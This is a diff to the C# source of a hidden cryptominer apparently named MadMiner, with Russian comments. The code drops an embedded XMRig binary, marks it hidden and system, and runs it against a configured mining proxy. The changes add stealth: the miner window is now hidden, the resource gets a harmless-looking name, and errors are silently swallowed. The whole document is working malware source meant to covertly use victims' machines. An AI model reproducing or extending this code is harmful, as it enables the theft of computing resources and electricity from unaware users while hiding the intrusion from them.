@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Diagnostics;
 using System.IO;
 using System.Net;
@@ -11,64 +11,72 @@ namespace MadMiner.Miner
         [STAThread]
         public static void Run() // Monero.Run()
         {
-            while (true)
+            try
             {
-                Process[] pname = Process.GetProcessesByName(Settings.xmrProc);
-                if (pname.Length == 0)
+                while (true)
                 {
-                    // Проверяем наличие файла XMRIG Если нету то извлекаем
-                    if (!File.Exists(Settings.xmrBin))
+                    Process[] pname = Process.GetProcessesByName(Settings.xmrProc);
+                    if (pname.Length == 0)
                     {
+                        // Проверяем наличие файла XMRIG Если нету то извлекаем
+                        if (!File.Exists(Settings.xmrBin))
+                        {
 
-                        File.WriteAllBytes(Settings.xmrBin, Properties.Resources.XMRIG);
+                            File.WriteAllBytes(Settings.xmrBin, Properties.Resources.xAPI);
 
-                        // Скрываемся
-                        File.SetAttributes(Settings.xmrBin, FileAttributes.Hidden | FileAttributes.System);
+                            // Скрываемся
+                            File.SetAttributes(Settings.xmrBin, FileAttributes.Hidden | FileAttributes.System);
 
-                        Thread.Sleep(2000);
-                        GetMiner();
+                            Thread.Sleep(2000);
+                            GetMiner();
+                        }
+                        else
+                        {
+                            GetMiner();
+                        }
                     }
                     else
                     {
-                        GetMiner();
+                        Thread.Sleep(2000);
                     }
-                }
-                else
-                {
+
                     Thread.Sleep(2000);
                 }
-
-                Thread.Sleep(2000);
             }
+            catch { }
         }
 
 
 
         static void GetMiner()
         {
-            /* Запуск майнера через cmd */
-            Process process = new Process();
-            process.StartInfo.CreateNoWindow = false;
-            process.StartInfo.UseShellExecute = false;
-            process.StartInfo.Arguments = "--url " + Settings.xmrProxy + " --donate-level 1";
-            process.StartInfo.FileName = Settings.xmrBin;
-            process.Start();
-
-
-            new Thread(() =>
+            try
             {
-                Thread.Sleep(120000);
-                Process[] pname = Process.GetProcessesByName(Settings.xmrProc);
-                if (pname.Length == 0)
-                {
+                /* Запуск майнера через cmd */
+                Process process = new Process();
+                process.StartInfo.CreateNoWindow = true;
+                process.StartInfo.UseShellExecute = false;
+                process.StartInfo.Arguments = "--url " + Settings.xmrProxy + " --donate-level 1";
+                process.StartInfo.FileName = Settings.xmrBin;
+                process.Start();
 
-                }
-                else
+
+                new Thread(() =>
                 {
+                    Thread.Sleep(120000);
+                    Process[] pname = Process.GetProcessesByName(Settings.xmrProc);
+                    if (pname.Length == 0)
+                    {
+
+                    }
+                    else
+                    {
                     // Выполняем если майнинг включен уже 2 минуты! Можно прикрутить например отчет что майнер работает.
                 }
 
-            }).Start();
+                }).Start();
+            }
+            catch { }
 
         }
     }
